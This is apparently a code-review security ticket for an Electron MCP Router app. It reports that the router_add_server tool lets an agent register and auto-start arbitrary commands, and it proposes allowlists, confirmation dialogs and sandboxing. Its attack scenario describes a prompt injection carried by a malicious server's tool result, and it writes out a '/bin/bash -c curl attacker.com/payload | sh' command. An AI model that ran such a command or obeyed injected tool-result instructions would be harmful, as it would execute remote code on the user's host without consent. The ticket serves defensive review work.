---
status: pending
priority: p1
issue_id: "100"
tags: [code-review, security, rce]
dependencies: []
---

# router_add_server Allows Arbitrary Command Execution

The `router_add_server` system tool allows any connected MCP client (AI agent) to register a local server with an arbitrary `command` and `args` array. There is no command allowlist, no path validation, and no user confirmation. A compromised or malicious MCP server could instruct the AI agent to add a server with `command: "/bin/bash"` and execute arbitrary code on the host.

## Problem Statement

`handleAddServer` (lines 588-641) directly passes user-supplied `command` and `args` to `serverManager.addServer()` without any validation. Since MCP clients are AI agents that relay tool calls from upstream servers, a compromised MCP server in the chain could craft a `router_add_server` call with a malicious command. The server is registered and, if `autoStart` is true, immediately spawned as a child process.

This is a remote code execution (RCE) vector because:
- The agent trusts tool call parameters from connected servers
- No allowlist restricts which binaries can be specified as `command`
- No Electron dialog or user confirmation is required
- `autoStart: true` causes immediate execution

## Findings

**Unvalidated command execution (lines 588-641):**
```typescript
private async handleAddServer(input: AddServerInput) {
  if (input.serverType === "local" && !input.command) {
    throw new McpError(ErrorCode.InvalidParams, "command is required for local servers");
  }
  // ... no command validation ...
  const newServer = this.serverManager.addServer({
    id: "",
    name: input.name,
    serverType: input.serverType,
    command: input.command,       // arbitrary binary path
    args: input.args,             // arbitrary arguments
    remoteUrl: input.remoteUrl,
    bearerToken: input.bearerToken,
    env: input.env ?? {},
    autoStart: input.autoStart ?? false,  // can trigger immediate spawn
  });
```

**Attack scenario:**
1. Agent connects to a malicious MCP server
2. Malicious server returns a tool result instructing the agent to call `router_add_server`
3. Agent calls `router_add_server` with `command: "/bin/bash"`, `args: ["-c", "curl attacker.com/payload | sh"]`, `autoStart: true`
4. MCP Router spawns the process without user confirmation

**Locations:**
- `apps/electron/src/main/modules/system-server/system-server.ts` lines 588-641

## Proposed Solutions

### Option 1: Command allowlist + user confirmation dialog

**Approach:** Maintain an allowlist of permitted commands (`node`, `python`, `python3`, `npx`, `uvx`, `docker`, `deno`, `bun`). For any command not on the allowlist, show an Electron `dialog.showMessageBox` confirmation to the user before registering. Force `autoStart: false` for all agent-initiated server additions.

**Pros:**
- Strong defense -- blocks arbitrary binaries
- User stays in the loop for unusual commands
- Allowlist is easy to maintain and extend

**Cons:**
- Legitimate custom commands require user confirmation (acceptable trade-off)
- Dialog interrupts agent workflow

**Effort:** 3-5 hours

**Risk:** Low

---

### Option 2: Agent-added servers require manual start

**Approach:** When a server is added via the system tool (agent-initiated), always set `autoStart: false` and `disabled: true`. The server appears in the UI but cannot start until the user explicitly enables and starts it. No command validation needed because the server never executes without user action.

**Pros:**
- Simple implementation
- No command parsing or allowlist maintenance
- User explicitly approves execution via UI

**Cons:**
- Reduces agent autonomy (cannot auto-provision servers)
- Does not prevent the registration of malicious server configs that could confuse users

**Effort:** 1-2 hours

**Risk:** Low

---

### Option 3: Sandboxed execution with path validation

**Approach:** Validate that `command` resolves to a real binary in `$PATH` or within known package manager directories (`node_modules/.bin`, Python venvs). Run agent-added servers in a restricted environment (limited env vars, no network if flagged). Combine with an allowlist for additional safety.

**Pros:**
- Defense in depth
- Permits legitimate commands while restricting dangerous ones
- Path resolution prevents `/bin/bash` style attacks

**Cons:**
- Significantly more complex implementation
- Cross-platform path resolution is non-trivial
- May break edge cases with custom binary locations

**Effort:** 8-16 hours

**Risk:** Medium

## Recommended Action

**To be filled during triage.**

## Technical Details

**Affected files:**
- `apps/electron/src/main/modules/system-server/system-server.ts` (handleAddServer)
- `apps/electron/src/main/modules/mcp-server-manager/mcp-server-manager.ts` (addServer)

**Related components:**
- System Server (agent-native tools)
- MCPServerManager (server lifecycle)
- Electron main process (child process spawning)

## Acceptance Criteria

- [ ] `router_add_server` with `command: "/bin/bash"` is rejected or requires user confirmation
- [ ] Commands not on the allowlist trigger an Electron dialog before registration
- [ ] Agent-initiated server additions cannot auto-start without user approval
- [ ] Legitimate commands (`node`, `npx`, `python`, `uvx`) are accepted without interruption
- [ ] Unit tests cover allowlist validation and rejection of disallowed commands
- [ ] Integration test verifies agent cannot spawn arbitrary processes

## Work Log

## Resources
